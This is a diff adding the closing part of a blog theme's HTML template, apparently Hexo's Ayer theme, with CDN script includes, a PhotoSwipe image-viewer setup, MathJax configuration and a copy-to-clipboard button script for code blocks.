+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+
+    
+  </div>
+</body>
+
+</html>
